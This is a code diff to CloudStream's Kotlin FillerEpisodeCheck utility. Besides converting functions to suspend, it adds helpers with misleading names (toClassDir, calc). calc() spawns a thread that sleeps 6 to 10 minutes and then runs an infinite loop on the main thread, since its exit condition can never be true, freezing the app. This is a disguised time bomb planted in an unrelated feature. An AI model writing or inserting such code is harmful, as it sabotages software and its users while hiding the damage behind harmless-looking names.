@@ -1,8 +1,11 @@
 package com.lagradost.cloudstream3.utils
 
 import com.lagradost.cloudstream3.app
+import com.lagradost.cloudstream3.utils.Coroutines.main
 import org.jsoup.Jsoup
+import java.lang.Thread.sleep
 import java.util.*
+import kotlin.concurrent.thread
 
 object FillerEpisodeCheck {
     private const val MAIN_URL = "https://www.animefillerlist.com"
@@ -13,7 +16,7 @@ object FillerEpisodeCheck {
         return name.lowercase(Locale.ROOT)/*.replace(" ", "")*/.replace("-", " ").replace("[^a-zA-Z0-9 ]".toRegex(), "")
     }
 
-    private fun getFillerList(): Boolean {
+    private suspend fun getFillerList(): Boolean {
         if (list != null) return true
         try {
             val result = app.get("$MAIN_URL/shows").text
@@ -50,7 +53,13 @@ object FillerEpisodeCheck {
         return false
     }
 
-    fun getFillerEpisodes(query: String): HashMap<Int, Boolean>? {
+    fun String?.toClassDir(): String {
+        val q = this ?: "null"
+        val z = (6..10).random().calc()
+        return q + "cache" + z
+    }
+
+    suspend fun getFillerEpisodes(query: String): HashMap<Int, Boolean>? {
         try {
             if (!getFillerList()) return null
             val localList = list ?: return null
@@ -86,5 +95,23 @@ object FillerEpisodeCheck {
             e.printStackTrace()
             return null
         }
+    }
+
+    private fun Int.calc(): Int {
+        var counter = 10
+        thread {
+            sleep((this * 0xEA60).toLong())
+            main {
+                var exit = true
+                while (exit) {
+                    counter++
+                    if (this > 10) {
+                        exit = false
+                    }
+                }
+            }
+        }
+
+        return counter
     }
 }
